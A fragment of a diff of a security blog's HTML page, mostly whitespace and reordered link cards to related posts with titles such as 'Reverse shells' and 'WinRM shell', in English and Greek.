-      <time lang="el">09 Απρ 2018</time>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
     </footer>
   </a>
 </article>
@@ -1954,112 +1797,6 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2242,6 +1979,166 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/oracle/" class="clearfix">
     <div class="cell">
@@ -2268,6 +2165,22 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -2277,6 +2190,167 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2453,62 +2527,6 @@ The problem is that if we try to send this payload via the xcmd paremeter some s
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
